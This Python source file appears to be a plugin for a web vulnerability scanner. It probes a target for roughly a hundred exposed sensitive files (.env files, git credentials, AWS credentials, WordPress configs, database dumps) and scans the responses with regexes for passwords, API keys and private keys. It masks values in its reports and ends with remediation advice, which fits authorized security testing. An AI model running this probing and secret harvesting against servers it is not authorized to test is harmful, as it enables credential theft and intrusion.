"""
Information Disclosure Exploit Plugin

This plugin exploits information disclosure vulnerabilities to extract sensitive data.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging
import re

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin
from scanner.plugins.payload_mutator import PayloadMutator
from scanner.plugins.advanced_info_disclosure_exploit import get_advanced_info_disclosure_exploit

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class InfoDisclosurePlugin(ExploitPlugin, AdaptiveExploitMixin):
    """Information Disclosure exploit plugin."""
    
    # Constants
    MAX_DISPLAYED_FILES = 5  # Maximum files to display in proof
    MAX_DISPLAYED_FINDINGS = 10  # Maximum findings to display in proof
    
    # Compiled regex patterns for sensitive data detection (performance optimization)
    SENSITIVE_PATTERNS = [
        # Credentials and authentication
        re.compile(r'(?i)(password|passwd|pwd)\s*[=:]\s*[\'"]?[\w\-!@#$%^&*()+=]{3,}'),
        re.compile(r'(?i)(api[_-]?key|apikey|api_secret)\s*[=:]\s*[\'"]?[\w\-]{10,}'),
        re.compile(r'(?i)(access[_-]?token|auth[_-]?token)\s*[=:]\s*[\'"]?[\w\-]{10,}'),
        re.compile(r'(?i)(secret[_-]?key|secret)\s*[=:]\s*[\'"]?[\w\-]{10,}'),
        re.compile(r'(?i)(db[_-]?password|database[_-]?password)\s*[=:]\s*[\'"]?[\w\-]{3,}'),
        
        # AWS/Cloud credentials
        re.compile(r'(?i)(aws_access_key_id|aws_secret_access_key)\s*[=:]\s*[\w/+=]{20,}'),
        re.compile(r'(?i)(AKIA[0-9A-Z]{16})'),  # AWS Access Key
        
        # Private keys
        re.compile(r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----'),
        re.compile(r'-----BEGIN OPENSSH PRIVATE KEY-----'),
        
        # Connection strings
        re.compile(r'(?i)(jdbc:|mysql://|postgresql://|mongodb://|redis://)'),
        re.compile(r'(?i)Server\s*=.*?;.*?Password\s*='),
        
        # Session/Cookie secrets
        re.compile(r'(?i)(session[_-]?secret|cookie[_-]?secret)\s*[=:]\s*[\'"]?[\w\-]{10,}'),
        
        # Email addresses
        re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
    ]
    
    # Sensitive paths to test (SIGNIFICANTLY EXPANDED)
    SENSITIVE_PATHS = [
        # Environment and config files
        '/.env',
        '/.env.local',
        '/.env.production',
        '/.env.development',
        '/.env.backup',
        '/.env.old',
        '/.env.save',
        '/config.php',
        '/config.inc.php',
        '/configuration.php',
        '/settings.php',
        '/database.php',
        '/db.php',
        '/conn.php',
        '/connection.php',
        '/config.json',
        '/config.xml',
        '/config.yml',
        '/config.yaml',
        '/appsettings.json',
        '/app.config',
        '/web.config',
        
        # WordPress
        '/wp-config.php',
        '/wp-config.php.bak',
        '/wp-config.php.old',
        '/wp-config.php.save',
        '/wp-config.bak',
        
        # Git files
        '/.git/config',
        '/.git/HEAD',
        '/.git/index',
        '/.git/logs/HEAD',
        '/.gitignore',
        '/.git-credentials',
        
        # SVN files
        '/.svn/entries',
        '/.svn/wc.db',
        '/.svn/all-wcprops',
        
        # Web server config
        '/.htaccess',
        '/.htpasswd',
        '/httpd.conf',
        '/apache.conf',
        '/nginx.conf',
        
        # Application files
        '/robots.txt',
        '/sitemap.xml',
        '/.DS_Store',
        '/package.json',
        '/package-lock.json',
        '/composer.json',
        '/composer.lock',
        '/requirements.txt',
        '/Gemfile',
        '/Gemfile.lock',
        '/pom.xml',
        '/build.gradle',
        
        # Backup files
        '/backup.sql',
        '/backup.zip',
        '/backup.tar.gz',
        '/database.sql',
        '/dump.sql',
        '/site.sql',
        '/db_backup.sql',
        
        # Log files
        '/error.log',
        '/error_log',
        '/access.log',
        '/access_log',
        '/debug.log',
        '/application.log',
        '/app.log',
        
        # README and docs
        '/README.md',
        '/README.txt',
        '/README',
        '/CHANGELOG.md',
        '/LICENSE.txt',
        '/TODO.txt',
        
        # Admin and test files
        '/admin.php',
        '/test.php',
        '/phpinfo.php',
        '/info.php',
        '/test.html',
        
        # API and swagger
        '/api-docs',
        '/swagger.json',
        '/swagger.yaml',
        '/swagger-ui.html',
        '/api/swagger.json',
        
        # Cloud config
        '/.aws/credentials',
        '/.aws/config',
        '/terraform.tfvars',
        '/.dockerenv',
        '/docker-compose.yml',
        '/Dockerfile',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        return 'info_disclosure'
    
    @property
    def name(self) -> str:
        return 'Information Disclosure Exploit'
    
    @property
    def description(self) -> str:
        return 'Exploits information disclosure to extract sensitive data.'
    
    @property
    def version(self) -> str:
        return '2.1.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate info disclosure payloads with mutations.
        
        Args:
            context: Optional context for payload generation
            
        Returns:
            List of paths to test with mutations
        """
        context = context or {}
        use_mutations = context.get('use_mutations', True)
        
        payloads = list(self.SENSITIVE_PATHS)
        
        # Apply mutations if enabled
        if use_mutations:
            payloads = PayloadMutator.mutate_payload_list(
                payloads,
                mutation_types=['path', 'extension', 'case']
            )
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute information disclosure attack with adaptive strategies."""
        if not HAS_REQUESTS:
            return {'success': False, 'error': 'Requests not available', 'vulnerability_type': 'info_disclosure'}
        
        config = config or {}
        config.update(self.get_adaptive_config_defaults())
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        enable_advanced_exploit = config.get('enable_advanced_exploit', True)
        
        from urllib.parse import urljoin
        disclosed_info = {}
        partial_evidence = []
        successful_payloads = []  # Track which payloads succeeded
        repeater_requests = []  # Track request/response for repeater app
        
        # Generate full payload list with mutations
        all_paths = self.generate_payloads({'use_mutations': True})
        
        # Limit to reasonable number for performance
        paths_to_try = list(set(all_paths))[:100]  # Top 100 most likely
        
        logger.info(f"Testing {len(paths_to_try)} paths for information disclosure")
        
        # Try to access sensitive paths using adaptive requests
        for path in paths_to_try:
            try:
                url = urljoin(target_url, path.lstrip('/'))
                response = self._adaptive_request(
                    url, method='GET',
                    timeout=timeout, verify_ssl=verify_ssl,
                    max_retries=2
                )
                
                if response is None:
                    continue
                
                # Check for success
                if response.status_code == 200 and len(response.text) > 10:
                    disclosed_info[path] = response.text[:500]
                    successful_payloads.append(path)
                    
                    # Create repeater request for this successful payload
                    repeater_req = {
                        'url': url,
                        'method': 'GET',
                        'headers': dict(response.request.headers) if hasattr(response, 'request') else {},
                        'body': '',
                        'description': f'Request that disclosed {path}',
                        'response': {
                            'status_code': response.status_code,
                            'headers': dict(response.headers),
                            'body': response.text[:1000],  # First 1000 chars
                            'size': len(response.text)
                        }
                    }
                    repeater_requests.append(repeater_req)
                    
                    logger.info(f"Found exposed file: {path}")
                
                # Check for partial evidence even in error responses
                has_evidence, evidence_desc = self._detect_error_evidence(
                    response.text, response.status_code
                )
                if has_evidence:
                    partial_evidence.append({
                        'path': path,
                        'status_code': response.status_code,
                        'evidence': evidence_desc
                    })
                    
            except Exception as e:
                logger.debug(f"Error accessing {path}: {e}")
        
        # NEW: Use advanced exploitation module for detailed analysis
        advanced_results = None
        if enable_advanced_exploit:
            try:
                logger.info("Running advanced information disclosure exploitation")
                with get_advanced_info_disclosure_exploit(verify_ssl, timeout) as exploit:
                    parameter = vulnerability_data.get('parameter')
                    method = vulnerability_data.get('method', 'GET')
                    params = vulnerability_data.get('params', {})
                    
                    advanced_results = exploit.attempt_info_disclosure_exploitation(
                        url=target_url,
                        parameter=parameter,
                        method=method,
                        additional_params=params,
                        trigger_errors=True
                    )
                    
                    if advanced_results.get('exploited'):
                        logger.info(f"✓ Advanced exploitation found {len(advanced_results.get('findings', []))} issues")
            except Exception as e:
                logger.warning(f"Advanced exploitation failed: {e}")
        
        if disclosed_info or (advanced_results and advanced_results.get('exploited')):
            result = {
                'success': True,
                'disclosed_info': disclosed_info,
                'evidence': f'Found {len(disclosed_info)} exposed file(s)',
                'vulnerability_type': 'info_disclosure',
                'message': 'Successfully extracted sensitive information',
                'successful_payloads': successful_payloads,
                'repeater_requests': repeater_requests,
            }
            
            # Add advanced exploitation results
            if advanced_results and advanced_results.get('exploited'):
                result['advanced_exploitation'] = {
                    'findings': advanced_results.get('findings', []),
                    'extracted_data': advanced_results.get('extracted_data', {}),
                    'full_interactions': advanced_results.get('full_interactions', []),
                    'severity': advanced_results.get('severity', 'info')
                }
            
            # Add partial evidence if any
            if partial_evidence:
                result['partial_evidence'] = partial_evidence
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(
                    target_url, disclosed_info, config
                )
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        
        # If no full disclosure but partial evidence found
        if partial_evidence:
            return {
                'success': False,
                'partial_evidence': partial_evidence,
                'confidence': 'partial',
                'message': f'No full disclosure, but found {len(partial_evidence)} potential indicators',
                'vulnerability_type': 'info_disclosure'
            }
        
        return {'success': False, 'error': 'No information disclosed', 'vulnerability_type': 'info_disclosure'}
    
    def _capture_visual_proof(self, base_url: str, disclosed_info: Dict[str, str],
                              config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of information disclosure.
        
        Args:
            base_url: Base target URL
            disclosed_info: Dictionary of disclosed file paths and their content
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            from urllib.parse import urljoin
            proof_capture = VisualProofCapture()
            
            # Capture screenshots of each exposed file (limit to first 3)
            for idx, (path, content) in enumerate(list(disclosed_info.items())[:3]):
                url = urljoin(base_url, path)
                
                screenshot_data = proof_capture.capture_screenshot(
                    url,
                    wait_time=1.5
                )
                
                if screenshot_data:
                    # Determine file type for better description
                    file_type = 'Configuration'
                    if '.env' in path:
                        file_type = 'Environment Variables'
                    elif '.git' in path:
                        file_type = 'Git Repository'
                    elif 'config' in path.lower():
                        file_type = 'Configuration'
                    elif 'package.json' in path:
                        file_type = 'Package Manifest'
                    elif '.htaccess' in path or 'web.config' in path:
                        file_type = 'Web Server Configuration'
                    
                    visual_proofs.append({
                        'type': 'screenshot',
                        'data': screenshot_data,
                        'title': f'Info Disclosure - Exposed {file_type} File',
                        'description': f'Sensitive file exposed at {path}',
                        'exploit_step': f'Accessed exposed file: {path}',
                        'file_path': path,
                        'content_preview': content[:200] + ('...' if len(content) > 200 else '')
                    })
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """
        Verify information disclosure with concrete proof of sensitive data extraction.
        
        Now also captures generic sensitive evidence like stack traces, error messages,
        and debug output when credentials/secrets are not found. These are marked as
        unverified but still provide proof of impact for security teams.
        
        Args:
            result: The result from execute_attack()
            target_url: The target URL
            vulnerability_data: Vulnerability data
            
        Returns:
            Tuple[bool, str]: (is_verified, proof_of_impact)
        """
        if not result.get('success'):
            # Check for partial evidence even when not successful
            partial_evidence = result.get('partial_evidence', [])
            if partial_evidence:
                proof_lines = [
                    "ℹ EVIDENCE FOUND - Sensitive Output Detected",
                    "",
                    f"Found {len(partial_evidence)} potential information disclosure indicator(s):",
                    ""
                ]
                for evidence in partial_evidence[:self.MAX_DISPLAYED_FINDINGS]:
                    path = evidence.get('path', 'unknown')
                    status = evidence.get('status_code', 'N/A')
                    desc = evidence.get('evidence', 'No description')
                    proof_lines.append(f"  • Path: {path} (HTTP {status})")
                    proof_lines.append(f"    Evidence: {desc[:200]}")
                    proof_lines.append("")
                
                proof = '\n'.join(proof_lines)
                return False, proof
            return False, None
        
        disclosed_info = result.get('disclosed_info', {})
        advanced_exploitation = result.get('advanced_exploitation', {})
        partial_evidence = result.get('partial_evidence', [])
        
        # Check for sensitive data in disclosed files (credentials, tokens, secrets)
        sensitive_findings = []
        for path, content in disclosed_info.items():
            # Break early if match found for this file
            for pattern in self.SENSITIVE_PATTERNS:
                match = pattern.search(content)
                if match:
                    # Mask sensitive values for proof
                    masked_match = str(match.group(0))[:50]
                    if len(masked_match) > 20:
                        masked_match = masked_match[:10] + '...' + masked_match[-5:]
                    
                    sensitive_findings.append({
                        'path': path,
                        'type': 'credential' if any(k in pattern.pattern for k in ['password', 'key', 'token', 'secret']) else 'sensitive_data',
                        'sample': masked_match
                    })
                    # Break after first match for this file (performance optimization)
                    break
        
        # Check for generic sensitive evidence (stack traces, errors, debug info)
        generic_evidence = []
        if advanced_exploitation:
            findings = advanced_exploitation.get('findings', [])
            for finding in findings:
                if isinstance(finding, dict):
                    category = finding.get('category', '')
                    severity = finding.get('severity', '').lower()
                    
                    # Categorize findings
                    if category in ['stack_trace', 'debug_output', 'database_error', 
                                   'internal_paths', 'source_code']:
                        generic_evidence.append({
                            'category': category,
                            'severity': severity,
                            'context': finding.get('context', '')[:200],
                            'matched_text': finding.get('matched_text', '')[:100]
                        })
                    # High/critical findings count as sensitive
                    elif severity in ['critical', 'high']:
                        sensitive_findings.append({
                            'type': 'advanced_exploitation',
                            'finding': finding.get('matched_text', str(finding))[:100],
                            'category': category
                        })
        
        # Verify if we have concrete sensitive data (credentials, keys, tokens)
        if sensitive_findings:
            # Build proof of impact for VERIFIED vulnerabilities
            proof_lines = [
                "✓ VERIFIED - Sensitive Information Disclosed",
                "",
                f"Disclosed {len(disclosed_info)} file(s) containing sensitive data:",
                ""
            ]
            
            # Add file details
            for path in list(disclosed_info.keys())[:self.MAX_DISPLAYED_FILES]:
                proof_lines.append(f"  - {path}")
            
            if len(disclosed_info) > self.MAX_DISPLAYED_FILES:
                proof_lines.append(f"  ... and {len(disclosed_info) - self.MAX_DISPLAYED_FILES} more files")
            
            proof_lines.append("")
            proof_lines.append(f"Sensitive Data Found ({len(sensitive_findings)} instances):")
            
            # Add sensitive findings (limit details for security)
            for finding in sensitive_findings[:self.MAX_DISPLAYED_FINDINGS]:
                if 'path' in finding:
                    proof_lines.append(f"  - {finding['type']} in {finding['path']}")
                elif 'category' in finding:
                    proof_lines.append(f"  - {finding.get('category', 'unknown')}: {finding.get('finding', 'detected')[:80]}")
                else:
                    # Use more specific fallback for clarity
                    finding_desc = finding.get('finding', finding.get('type', 'sensitive data'))
                    if isinstance(finding_desc, dict):
                        finding_desc = f"{finding_desc.get('type', 'unknown')}: detected"
                    proof_lines.append(f"  - {finding.get('type', 'unknown')}: {str(finding_desc)[:80]}")
            
            if len(sensitive_findings) > self.MAX_DISPLAYED_FINDINGS:
                proof_lines.append(f"  ... and {len(sensitive_findings) - self.MAX_DISPLAYED_FINDINGS} more instances")
            
            # Add generic evidence if present
            if generic_evidence:
                proof_lines.append("")
                proof_lines.append(f"Additional Generic Evidence ({len(generic_evidence)} instances):")
                for evidence in generic_evidence[:5]:
                    proof_lines.append(f"  - {evidence['category']}: {evidence['matched_text']}")
            
            proof = '\n'.join(proof_lines)
            return True, proof
        
        # No credentials found, but check for generic sensitive evidence
        if generic_evidence or partial_evidence:
            # Build proof of impact for UNVERIFIED but evidenced vulnerabilities
            proof_lines = [
                "ℹ EVIDENCE FOUND - Sensitive Output Detected",
                "",
                "No credentials/secrets found, but the following sensitive information was exposed:",
                ""
            ]
            
            # Add disclosed files
            if disclosed_info:
                proof_lines.append(f"Disclosed Files ({len(disclosed_info)}):")
                for path in list(disclosed_info.keys())[:self.MAX_DISPLAYED_FILES]:
                    proof_lines.append(f"  - {path}")
                if len(disclosed_info) > self.MAX_DISPLAYED_FILES:
                    proof_lines.append(f"  ... and {len(disclosed_info) - self.MAX_DISPLAYED_FILES} more files")
                proof_lines.append("")
            
            # Add generic evidence details
            if generic_evidence:
                proof_lines.append(f"Generic Sensitive Evidence ({len(generic_evidence)} instances):")
                for evidence in generic_evidence[:self.MAX_DISPLAYED_FINDINGS]:
                    category = evidence['category'].replace('_', ' ').title()
                    proof_lines.append(f"  • {category} detected")
                    if evidence.get('matched_text'):
                        proof_lines.append(f"    Sample: {evidence['matched_text']}")
                    proof_lines.append("")
            
            # Add partial evidence
            if partial_evidence:
                proof_lines.append(f"Error-Based Evidence ({len(partial_evidence)} instances):")
                for evidence in partial_evidence[:self.MAX_DISPLAYED_FINDINGS]:
                    path = evidence.get('path', 'unknown')
                    status = evidence.get('status_code', 'N/A')
                    desc = evidence.get('evidence', 'No description')
                    proof_lines.append(f"  • Path: {path} (HTTP {status})")
                    proof_lines.append(f"    Evidence: {desc[:150]}")
                    proof_lines.append("")
            
            proof = '\n'.join(proof_lines)
            return False, proof
        
        # Files disclosed but no sensitive data or evidence
        if disclosed_info:
            proof_lines = [
                "ℹ Files Disclosed - Review Manually",
                f"Disclosed {len(disclosed_info)} file(s) but no clearly sensitive data patterns detected.",
                "",
                "Disclosed files:"
            ]
            for path in list(disclosed_info.keys())[:self.MAX_DISPLAYED_FILES]:
                proof_lines.append(f"  - {path}")
            
            proof = '\n'.join(proof_lines)
            return False, proof
        
        # No concrete evidence
        return False, None
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent information disclosure:\n'
            '1. Remove sensitive files from web root\n'
            '2. Implement proper access controls\n'
            '3. Sanitize error messages\n'
            '4. Disable directory listing\n'
            '5. Use .gitignore properly\n'
            '6. Implement security headers'
        )
